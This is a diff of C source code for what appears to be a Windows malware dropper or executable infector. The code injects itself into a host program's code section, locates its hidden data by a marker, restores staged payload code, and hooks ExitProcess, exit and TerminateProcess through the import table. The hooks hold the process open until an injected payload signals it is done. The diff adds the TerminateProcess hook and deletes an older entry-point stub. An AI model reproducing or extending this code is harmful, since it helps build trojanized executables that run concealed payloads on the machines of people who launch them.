@@ -81,22 +81,23 @@ XREFNAMES data_imports[] = {
 			"GetVersionExA",		// 29
 			"IsWow64Process",		// 30
 			"GetCurrentProcess",	// 31
+			"TerminateProcess",     // 32
 			NULL
 	}
 	}, // KERNEL32.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 32
-		"exit",					// 33
-		"_exit",				// 34
+		"sprintf",				// 33
+		"exit",					// 34
+		"_exit",				// 35
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 35
+		"GetCurrentHwProfileA", // 36
 	}
 	}, // ADVAPI32.DLL
 
@@ -136,27 +137,11 @@ char * _needed_strings[] = {
 	"Sys MinorVersion %d", // 27
 	"Restoring stage1 code", //28
 	"Restoring stage2 code", //29
+	"TerminateProcess hooked", // 30
 #endif
 
 	NULL
 };
-
-#if 0
-BYTE oepStub[OEPSTUBSIZE] = {
-	0x33, 0xc0,						// xor eax, eax
-	0xb8, 0x00, 0x00, 0xff, 0xff,	// mov eax, dropperEP.ffff0000	[byte 5 and 6 to be patched]
-	0xb4, 0xff,						// mov ah,  dropperEP.0000ff00	[byte 9 to be patched]
-	0xb0, 0xff,      				// mov al,  dropperEP.000000ff	[byte 13 to be patched]
-	0xeb, 0xff, 0xf0,				// PUSH EAX
-	0x59,							// pop ecx
-	0xeb, 0xff, 0xf1,				// PUSH ECX
-	0x58,							// pop eax
-	0xeb, 0xff, 0xc0,				// INC EAX
-	0x0e,							// PUSH CS
-	0xeb, 0xff, 0xf0,				// PUSH EAX
-	0xc3     						// jmp ecx
-};
-#endif
 
 #pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
@@ -547,11 +532,13 @@ NEXT_ENTRY:
 	//
 	HOOKCALL pfn_HookCall = (HOOKCALL) (((char*)header) + header->functions.hookCall.offset);
 	EXITPROCESS pfn_ExitProcessHook = (EXITPROCESS)( ((char*)header) + header->functions.exitProcessHook.offset);
+	TERMINATEPROCESS pfn_TerminateProcessHook = (TERMINATEPROCESS)( ((char*)header) + header->functions.terminateProcessHook.offset);
 	EXIT pfn_ExitHook = (EXIT) ( ((char*)header) + header->functions.exitHook.offset);
 	
 	// we can proceed even if hooking is not successful
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	if (pfn_HookCall && IAT_rva) {
+		// ExitProcess
 		if (pfn_ExitProcessHook) {
 			DWORD ret = -1;
 			ret = pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->hookedCalls.ExitProcess, (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
@@ -559,6 +546,15 @@ NEXT_ENTRY:
 				MESSAGE(STRING(STRIDX_EXITPROCHOOKED));
 		}
 
+		// TerminateProcess
+		if (pfn_TerminateProcessHook) {
+			DWORD ret = -1;
+			ret = pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->hookedCalls.TerminateProcess, (DWORD)pfn_TerminateProcessHook, IAT_rva, imageBase, header);
+			if (ret == 0)
+				MESSAGE(STRING(STRIDX_TERMINATEPROCESS));
+		}
+
+		// exit / _exit
 		if (pfn_ExitHook) {
 			DWORD ret = -1;
 			ret = pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->hookedCalls.exit, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
@@ -611,32 +607,6 @@ OEP_CALL:
 		_MEMCPY_( (char*) header->stage2.VA, code, size );
 		pfn_VirtualProtect( (LPVOID) header->stage2.VA, size, oldProtect, &oldProtect );
 	}
-	
-#if 0
-	OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-	
-	MESSAGE(STRING(STRIDX_RESTOREOEP));
-	
-	if (header->originalOEPCode.offset != 0)
-	{
-		DWORD oldProtect = 0;
-		char* OEPcode = (char *) (((char*)header) + header->originalOEPCode.offset);
-		size_t OEPsize = header->originalOEPCode.size;
-		
-		pfn_VirtualProtect((LPVOID)OEP, OEPsize, PAGE_EXECUTE_READWRITE, &oldProtect);		
-		_MEMCPY_((char*)(OEP), OEPcode, OEPsize);
-		pfn_VirtualProtect((LPVOID)OEP, OEPsize, oldProtect, &oldProtect);
-	}
-	
-	MESSAGE(STRING(STRIDX_OEPRESTORED));
-	MESSAGE1(STRIDX_CALLINGOEP, OEP);
-#endif
-	
-#if 0
-	// ((WINSTARTFUNC)OEP)();
-	WINSTARTFUNC pfn_OEP = (WINSTARTFUNC) (((char*)header) + header->restore.offset);
-	pfn_OEP();
-#endif
 	
 	return 0;
 }
@@ -783,13 +753,61 @@ lbl_ref1:
 	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
 	
 	while (header->synchro != 1)
-		pfn_Sleep(100);
+		pfn_Sleep(HOOKSLEEPTIME);
 	
 	MESSAGE(STRING(STRIDX_VECTORQUIT));
 	
 	pfn_OriginalExitProcess(uExitCode);
 }
 FUNCTION_END(ExitProcessHook);
+
+BOOL WINAPI TerminateProcessHook(__in HANDLE hProcess, __in  UINT uExitCode)
+{
+	DWORD dwCurrentAddr = 0;
+	DWORD dwMagic = 0;
+
+	// Get current EIP in dwCurrentAddr
+	__asm{
+		call lbl_ref1
+lbl_ref1:
+		pop dwCurrentAddr
+	}
+
+	// *** Find the ending marker of data section <E> 
+	while ( dwMagic != 0x003E453C )
+		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
+
+	// *** Total size of data section
+	dwCurrentAddr -= sizeof(DWORD);
+	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
+	
+	// *** Pointer to data section header
+	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
+	
+	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
+	char * strings = (char *) (((char*)header) + header->strings.offset);
+	char * dlls = (char *) (((char*)header) + header->dlls.offset);
+	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
+	
+	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
+	TERMINATEPROCESS pfn_OriginalTerminateProcess = (TERMINATEPROCESS) dll_calls[CALL_TERMINATEPROCESS];
+	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
+	
+	// if not killing self, pass through to original TerminateProcess
+	if (hProcess != pfn_GetCurrentProcess())
+		return pfn_OriginalTerminateProcess(hProcess, uExitCode);
+	
+	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
+	
+	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
+	while (header->synchro != 1)
+		pfn_Sleep(HOOKSLEEPTIME);
+	
+	MESSAGE(STRING(STRIDX_VECTORQUIT));
+	
+	return pfn_OriginalTerminateProcess(hProcess, uExitCode);
+}
+FUNCTION_END(TerminateProcessHook);
 
 __declspec(noreturn) void __cdecl ExitHook(int status)
 {
@@ -829,7 +847,7 @@ lbl_ref1:
 	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
 	
 	while (header->synchro != 1)
-		pfn_Sleep(100);
+		pfn_Sleep(HOOKSLEEPTIME);
 	
 	MESSAGE(STRING(STRIDX_VECTORQUIT));
 		
